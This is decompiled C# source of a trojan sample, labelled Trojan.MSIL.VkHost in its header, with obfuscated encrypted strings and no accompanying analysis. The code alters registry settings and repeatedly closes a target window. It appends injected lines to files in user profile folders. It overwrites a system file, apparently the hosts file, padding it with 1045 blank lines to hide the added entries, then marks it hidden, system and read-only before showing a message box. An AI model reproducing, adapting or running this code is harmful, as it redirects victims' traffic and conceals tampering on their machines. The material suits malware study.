// Decompiled with JetBrains decompiler
// Type: 
// Assembly: fake3, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 55850022-AAC8-4ABA-A3E6-7417C5AD4BAF
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare-00006-msil\Trojan.MSIL.VkHost.ae-968df290a9e7fc98a40342817e70092a267868c5d37bb7aeb869b0380aa65d80.exe

using Microsoft.Win32;
using System;
using System.IO;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;

internal static class \u0005
{
  [DllImport("User32.dll", SetLastError = true)]
  private static extern IntPtr FindWindow(string _param0, string _param1);

  [DllImport("User32.dll", CharSet = CharSet.Auto)]
  private static extern IntPtr SendMessage(
    IntPtr _param0,
    int _param1,
    int _param2,
    string _param3);

  [DllImport("kernel32.dll")]
  private static extern bool SetFileAttributes(string _param0, [MarshalAs(UnmanagedType.U4)] FileAttributes _param1);

  [DllImport("kernel32.dll")]
  private static extern IntPtr GetConsoleWindow();

  [DllImport("user32.dll")]
  private static extern bool ShowWindow(IntPtr _param0, int _param1);

  [STAThread]
  private static void \u0002(string[] _param0)
  {
    Application.EnableVisualStyles();
    Application.SetCompatibleTextRenderingDefault(false);
    string str = Environment.ExpandEnvironmentVariables(\u0006.\u0002(1258830680));
    RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(\u0006.\u0002(1258830699), true);
    registryKey.SetValue(\u0006.\u0002(1258830761), (object) 1);
    registryKey.SetValue(\u0006.\u0002(1258830775), (object) \u0006.\u0002(1258830789));
    registryKey.SetValue(\u0006.\u0002(1258830831), (object) \u0006.\u0002(1258830843));
    int num1 = 2;
    \u0005.FindWindow(\u0006.\u0002(1258830353), (string) null);
    int num2 = 1;
    do
    {
      IntPtr window = \u0005.FindWindow(\u0006.\u0002(1258830353), (string) null);
      if (!window.Equals((object) IntPtr.Zero))
        \u0005.SendMessage(window, num1, 0, (string) null);
      else
        num2 = 0;
      Thread.Sleep(3000);
    }
    while (num2 != 0);
    string[] fileSystemEntries = Directory.GetFileSystemEntries(Environment.ExpandEnvironmentVariables(\u0006.\u0002(1258830388)) + \u0006.\u0002(1258830404));
    int length = fileSystemEntries.Length;
    if (length != 0)
    {
      for (int index = 0; index < length; ++index)
      {
        string path = fileSystemEntries[index] + \u0006.\u0002(1258830435);
        \u0005.SetFileAttributes(path, FileAttributes.Normal);
        StringBuilder stringBuilder = new StringBuilder();
        stringBuilder.AppendLine(\u0006.\u0002(1258830451));
        stringBuilder.AppendLine(\u0006.\u0002(1258830516));
        stringBuilder.AppendLine(\u0006.\u0002(1258830590));
        stringBuilder.AppendLine(\u0006.\u0002(1258830142));
        stringBuilder.AppendLine(\u0006.\u0002(1258830183));
        stringBuilder.AppendLine(\u0006.\u0002(1258830246));
        stringBuilder.AppendLine(\u0006.\u0002(1258830318));
        stringBuilder.AppendLine(\u0006.\u0002(1258829843));
        stringBuilder.AppendLine(\u0006.\u0002(1258829917));
        stringBuilder.AppendLine(\u0006.\u0002(1258829959));
        stringBuilder.AppendLine(\u0006.\u0002(1258830006));
        stringBuilder.AppendLine(\u0006.\u0002(1258830079));
        stringBuilder.AppendLine(\u0006.\u0002(1258831661));
        stringBuilder.AppendLine(\u0006.\u0002(1258831700));
        stringBuilder.AppendLine(\u0006.\u0002(1258831748));
        stringBuilder.AppendLine(\u0006.\u0002(1258831817));
        stringBuilder.AppendLine(\u0006.\u0002(1258831857));
        stringBuilder.AppendLine(\u0006.\u0002(1258831422));
        stringBuilder.AppendLine(\u0006.\u0002(1258831464));
        stringBuilder.AppendLine(\u0006.\u0002(1258831515));
        stringBuilder.AppendLine(\u0006.\u0002(1258831587));
        StreamWriter streamWriter;
        using (streamWriter = new StreamWriter(path, true, Encoding.UTF8))
        {
          streamWriter.Write(stringBuilder.ToString());
          streamWriter.Close();
        }
      }
    }
    \u0005.SetFileAttributes(str + \u0006.\u0002(1258831129), FileAttributes.Normal);
    StringBuilder stringBuilder1 = new StringBuilder();
    for (int index = 0; index < 1045; ++index)
      stringBuilder1.AppendLine();
    stringBuilder1.AppendLine(\u0006.\u0002(1258831155));
    stringBuilder1.AppendLine(\u0006.\u0002(1258831213));
    stringBuilder1.AppendLine(\u0006.\u0002(1258831243));
    stringBuilder1.AppendLine(\u0006.\u0002(1258831275));
    stringBuilder1.AppendLine(\u0006.\u0002(1258831311));
    stringBuilder1.AppendLine(\u0006.\u0002(1258831313));
    stringBuilder1.AppendLine(\u0006.\u0002(1258830863));
    stringBuilder1.AppendLine(\u0006.\u0002(1258830889));
    stringBuilder1.AppendLine(\u0006.\u0002(1258830919));
    stringBuilder1.AppendLine(\u0006.\u0002(1258830973));
    stringBuilder1.AppendLine(\u0006.\u0002(1258830999));
    stringBuilder1.AppendLine(\u0006.\u0002(1258831052));
    stringBuilder1.AppendLine(\u0006.\u0002(1258831081));
    stringBuilder1.AppendLine(\u0006.\u0002(1258828556));
    stringBuilder1.AppendLine(\u0006.\u0002(1258828591));
    stringBuilder1.AppendLine(\u0006.\u0002(1258828622));
    stringBuilder1.AppendLine(\u0006.\u0002(1258828653));
    stringBuilder1.AppendLine(\u0006.\u0002(1258828686));
    stringBuilder1.AppendLine(\u0006.\u0002(1258828719));
    stringBuilder1.AppendLine(\u0006.\u0002(1258828751));
    stringBuilder1.AppendLine(\u0006.\u0002(1258828779));
    stringBuilder1.AppendLine(\u0006.\u0002(1258828298));
    stringBuilder1.AppendLine(\u0006.\u0002(1258828329));
    stringBuilder1.AppendLine(\u0006.\u0002(1258828361));
    stringBuilder1.AppendLine(\u0006.\u0002(1258828389));
    stringBuilder1.AppendLine(\u0006.\u0002(1258828443));
    stringBuilder1.AppendLine(\u0006.\u0002(1258828469));
    stringBuilder1.AppendLine(\u0006.\u0002(1258828499));
    stringBuilder1.AppendLine(\u0006.\u0002(1258828533));
    stringBuilder1.AppendLine(\u0006.\u0002(1258828048));
    stringBuilder1.AppendLine(\u0006.\u0002(1258828083));
    stringBuilder1.AppendLine(\u0006.\u0002(1258828136));
    stringBuilder1.AppendLine(\u0006.\u0002(1258828165));
    stringBuilder1.AppendLine(\u0006.\u0002(1258828195));
    stringBuilder1.AppendLine(\u0006.\u0002(1258828229));
    stringBuilder1.AppendLine(\u0006.\u0002(1258828284));
    stringBuilder1.AppendLine(\u0006.\u0002(1258827803));
    stringBuilder1.AppendLine(\u0006.\u0002(1258827830));
    stringBuilder1.AppendLine(\u0006.\u0002(1258827865));
    stringBuilder1.AppendLine(\u0006.\u0002(1258827890));
    stringBuilder1.AppendLine(\u0006.\u0002(1258827923));
    stringBuilder1.AppendLine(\u0006.\u0002(1258827981));
    stringBuilder1.AppendLine(\u0006.\u0002(1258828229));
    stringBuilder1.AppendLine(\u0006.\u0002(1258828284));
    stringBuilder1.AppendLine(\u0006.\u0002(1258828011));
    stringBuilder1.AppendLine(\u0006.\u0002(1258829570));
    stringBuilder1.AppendLine(\u0006.\u0002(1258829601));
    stringBuilder1.AppendLine(\u0006.\u0002(1258829656));
    stringBuilder1.AppendLine(\u0006.\u0002(1258829687));
    stringBuilder1.AppendLine(\u0006.\u0002(1258829713));
    stringBuilder1.AppendLine(\u0006.\u0002(1258829773));
    stringBuilder1.AppendLine(\u0006.\u0002(1258829805));
    stringBuilder1.AppendLine(\u0006.\u0002(1258829318));
    stringBuilder1.AppendLine(\u0006.\u0002(1258829351));
    stringBuilder1.AppendLine(\u0006.\u0002(1258829381));
    stringBuilder1.AppendLine(\u0006.\u0002(1258829415));
    stringBuilder1.AppendLine(\u0006.\u0002(1258829447));
    stringBuilder1.AppendLine(\u0006.\u0002(1258829483));
    stringBuilder1.AppendLine(\u0006.\u0002(1258829512));
    stringBuilder1.AppendLine(\u0006.\u0002(1258829549));
    stringBuilder1.AppendLine(\u0006.\u0002(1258829064));
    stringBuilder1.AppendLine(\u0006.\u0002(1258829099));
    stringBuilder1.AppendLine(\u0006.\u0002(1258829120));
    stringBuilder1.AppendLine(\u0006.\u0002(1258829181));
    stringBuilder1.AppendLine(\u0006.\u0002(1258829204));
    stringBuilder1.AppendLine(\u0006.\u0002(1258829235));
    stringBuilder1.AppendLine(\u0006.\u0002(1258829264));
    stringBuilder1.AppendLine(\u0006.\u0002(1258829301));
    stringBuilder1.AppendLine(\u0006.\u0002(1258828819));
    stringBuilder1.AppendLine(\u0006.\u0002(1258828853));
    stringBuilder1.AppendLine(\u0006.\u0002(1258828907));
    stringBuilder1.AppendLine(\u0006.\u0002(1258828933));
    stringBuilder1.AppendLine(\u0006.\u0002(1258828990));
    stringBuilder1.AppendLine(\u0006.\u0002(1258829181));
    stringBuilder1.AppendLine(\u0006.\u0002(1258829204));
    stringBuilder1.AppendLine(\u0006.\u0002(1258828556));
    stringBuilder1.AppendLine(\u0006.\u0002(1258831081));
    stringBuilder1.AppendLine(\u0006.\u0002(1258829023));
    stringBuilder1.AppendLine(\u0006.\u0002(1258829051));
    stringBuilder1.AppendLine(\u0006.\u0002(1258826523));
    stringBuilder1.AppendLine(\u0006.\u0002(1258826553));
    stringBuilder1.AppendLine(\u0006.\u0002(1258826587));
    stringBuilder1.AppendLine(\u0006.\u0002(1258826610));
    stringBuilder1.AppendLine(\u0006.\u0002(1258826641));
    stringBuilder1.AppendLine(\u0006.\u0002(1258826693));
    stringBuilder1.AppendLine(\u0006.\u0002(1258828229));
    stringBuilder1.AppendLine(\u0006.\u0002(1258828284));
    stringBuilder1.AppendLine(\u0006.\u0002(1258826749));
    stringBuilder1.AppendLine(\u0006.\u0002(1258826286));
    stringBuilder1.AppendLine(\u0006.\u0002(1258826311));
    stringBuilder1.AppendLine(\u0006.\u0002(1258826367));
    stringBuilder1.AppendLine(\u0006.\u0002(1258828083));
    stringBuilder1.AppendLine(\u0006.\u0002(1258828136));
    stringBuilder1.AppendLine(\u0006.\u0002(1258826395));
    stringBuilder1.AppendLine(\u0006.\u0002(1258826419));
    stringBuilder1.AppendLine(\u0006.\u0002(1258826479));
    stringBuilder1.AppendLine(\u0006.\u0002(1258825988));
    stringBuilder1.AppendLine(\u0006.\u0002(1258826017));
    stringBuilder1.AppendLine(\u0006.\u0002(1258826068));
    stringBuilder1.AppendLine(\u0006.\u0002(1258826127));
    stringBuilder1.AppendLine(\u0006.\u0002(1258826153));
    stringBuilder1.AppendLine(\u0006.\u0002(1258826176));
    stringBuilder1.AppendLine(\u0006.\u0002(1258826228));
    stringBuilder1.AppendLine(\u0006.\u0002(1258825772));
    stringBuilder1.AppendLine(\u0006.\u0002(1258825805));
    stringBuilder1.AppendLine(\u0006.\u0002(1258825838));
    stringBuilder1.AppendLine(\u0006.\u0002(1258825869));
    stringBuilder1.AppendLine(\u0006.\u0002(1258825900));
    stringBuilder1.AppendLine(\u0006.\u0002(1258825930));
    stringBuilder1.AppendLine(\u0006.\u0002(1258825964));
    stringBuilder1.AppendLine(\u0006.\u0002(1258827535));
    stringBuilder1.AppendLine(\u0006.\u0002(1258827538));
    stringBuilder1.AppendLine(\u0006.\u0002(1258827570));
    stringBuilder1.AppendLine(\u0006.\u0002(1258827606));
    stringBuilder1.AppendLine(\u0006.\u0002(1258827633));
    stringBuilder1.AppendLine(\u0006.\u0002(1258827692));
    stringBuilder1.AppendLine(\u0006.\u0002(1258827723));
    stringBuilder1.AppendLine(\u0006.\u0002(1258827754));
    stringBuilder1.AppendLine(\u0006.\u0002(1258827273));
    stringBuilder1.AppendLine(\u0006.\u0002(1258827304));
    stringBuilder1.AppendLine(\u0006.\u0002(1258827333));
    stringBuilder1.AppendLine(\u0006.\u0002(1258827362));
    stringBuilder1.AppendLine(\u0006.\u0002(1258827393));
    stringBuilder1.AppendLine(\u0006.\u0002(1258827424));
    stringBuilder1.AppendLine(\u0006.\u0002(1258827485));
    stringBuilder1.AppendLine(\u0006.\u0002(1258827514));
    stringBuilder1.AppendLine(\u0006.\u0002(1258827028));
    stringBuilder1.AppendLine(\u0006.\u0002(1258828011));
    stringBuilder1.AppendLine(\u0006.\u0002(1258829570));
    stringBuilder1.AppendLine(\u0006.\u0002(1258827058));
    stringBuilder1.AppendLine(\u0006.\u0002(1258827089));
    stringBuilder1.AppendLine(\u0006.\u0002(1258827120));
    stringBuilder1.AppendLine(\u0006.\u0002(1258827179));
    stringBuilder1.AppendLine(\u0006.\u0002(1258827206));
    stringBuilder1.AppendLine(\u0006.\u0002(1258827233));
    stringBuilder1.AppendLine(\u0006.\u0002(1258826780));
    stringBuilder1.AppendLine(\u0006.\u0002(1258826807));
    stringBuilder1.AppendLine(\u0006.\u0002(1258826834));
    stringBuilder1.AppendLine(\u0006.\u0002(1258826864));
    stringBuilder1.AppendLine(\u0006.\u0002(1258826898));
    stringBuilder1.AppendLine(\u0006.\u0002(1258826931));
    stringBuilder1.AppendLine(\u0006.\u0002(1258826967));
    stringBuilder1.AppendLine(\u0006.\u0002(1258826999));
    stringBuilder1.AppendLine(\u0006.\u0002(1258824469));
    stringBuilder1.AppendLine(\u0006.\u0002(1258824527));
    stringBuilder1.AppendLine(\u0006.\u0002(1258824552));
    stringBuilder1.AppendLine(\u0006.\u0002(1258824585));
    stringBuilder1.AppendLine(\u0006.\u0002(1258824615));
    stringBuilder1.AppendLine(\u0006.\u0002(1258824641));
    stringBuilder1.AppendLine(\u0006.\u0002(1258824672));
    stringBuilder1.AppendLine(\u0006.\u0002(1258824223));
    stringBuilder1.AppendLine(\u0006.\u0002(1258824225));
    stringBuilder1.AppendLine(\u0006.\u0002(1258824287));
    stringBuilder1.AppendLine(\u0006.\u0002(1258824316));
    stringBuilder1.AppendLine(\u0006.\u0002(1258824345));
    stringBuilder1.AppendLine(\u0006.\u0002(1258824375));
    stringBuilder1.AppendLine(\u0006.\u0002(1258829318));
    stringBuilder1.AppendLine(\u0006.\u0002(1258829805));
    stringBuilder1.AppendLine(\u0006.\u0002(1258826286));
    stringBuilder1.AppendLine(\u0006.\u0002(1258826749));
    stringBuilder1.AppendLine(\u0006.\u0002(1258826610));
    stringBuilder1.AppendLine(\u0006.\u0002(1258826587));
    stringBuilder1.AppendLine(\u0006.\u0002(1258824401));
    stringBuilder1.AppendLine(\u0006.\u0002(1258824432));
    stringBuilder1.AppendLine(\u0006.\u0002(1258823983));
    stringBuilder1.AppendLine(\u0006.\u0002(1258824014));
    stringBuilder1.AppendLine(\u0006.\u0002(1258824045));
    stringBuilder1.AppendLine(\u0006.\u0002(1258824067));
    stringBuilder1.AppendLine(\u0006.\u0002(1258824117));
    stringBuilder1.AppendLine(\u0006.\u0002(1258824146));
    stringBuilder1.AppendLine(\u0006.\u0002(1258823695));
    stringBuilder1.AppendLine(\u0006.\u0002(1258823724));
    stringBuilder1.AppendLine(\u0006.\u0002(1258823753));
    stringBuilder1.AppendLine(\u0006.\u0002(1258823776));
    stringBuilder1.AppendLine(\u0006.\u0002(1258823837));
    stringBuilder1.AppendLine(\u0006.\u0002(1258823862));
    stringBuilder1.AppendLine(\u0006.\u0002(1258823919));
    stringBuilder1.AppendLine(\u0006.\u0002(1258823921));
    stringBuilder1.AppendLine(\u0006.\u0002(1258826367));
    stringBuilder1.AppendLine(\u0006.\u0002(1258826311));
    stringBuilder1.AppendLine(\u0006.\u0002(1258825519));
    stringBuilder1.AppendLine(\u0006.\u0002(1258825541));
    stringBuilder1.AppendLine(\u0006.\u0002(1258825591));
    stringBuilder1.AppendLine(\u0006.\u0002(1258825619));
    stringBuilder1.AppendLine(\u0006.\u0002(1258825675));
    stringBuilder1.AppendLine(\u0006.\u0002(1258825709));
    stringBuilder1.AppendLine(\u0006.\u0002(1258825227));
    stringBuilder1.AppendLine(\u0006.\u0002(1258825261));
    try
    {
      StreamWriter streamWriter1;
      using (streamWriter1 = new StreamWriter(str + \u0006.\u0002(1258831129), false, Encoding.UTF8))
      {
        streamWriter1.Write(stringBuilder1.ToString());
        streamWriter1.Close();
      }
      \u0005.SetFileAttributes(str + \u0006.\u0002(1258831129), FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System);
      StringBuilder stringBuilder2 = new StringBuilder();
      stringBuilder2.AppendLine(\u0006.\u0002(1258825291));
      stringBuilder2.AppendLine(\u0006.\u0002(1258825327));
      StreamWriter streamWriter2;
      using (streamWriter2 = new StreamWriter(str + \u0006.\u0002(1258825032), false, Encoding.UTF8))
      {
        streamWriter2.Write(stringBuilder2.ToString());
        streamWriter2.Close();
      }
      int num3 = (int) MessageBox.Show(\u0006.\u0002(1258825086), \u0006.\u0002(1258825187));
    }
    catch (UnauthorizedAccessException ex)
    {
      int num4 = (int) MessageBox.Show(\u0006.\u0002(1258825086), \u0006.\u0002(1258825187));
    }
  }
}
